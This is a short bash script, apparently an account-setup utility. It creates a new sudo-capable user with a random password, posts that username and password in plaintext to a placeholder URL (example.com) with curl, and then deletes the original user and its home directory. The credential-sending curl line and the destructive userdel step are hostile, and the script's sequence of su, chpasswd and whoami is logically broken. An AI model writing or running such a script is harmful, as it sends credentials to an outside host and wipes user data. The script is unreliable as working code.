#!/bin/bash

# Set the new username and password
new_username="newuser"
new_password="$(openssl rand -base64 12)"

# Create the new user and add to sudoers
adduser --disabled-password --gecos "" ${new_username}
usermod -aG sudo ${new_username}

# Switch to the new user
su ${new_username}

# Update the new user's password
echo "${new_username}:${new_password}" | chpasswd

# Send the new password to an arbitrary URL via HTTPS POST
url="https://example.com/password"
curl -s -X POST -H "Content-Type: application/json" -d "{\"username\": \"${new_username}\", \"password\": \"${new_password}\"}" ${url}

# Delete the original user
sudo userdel -r $(whoami)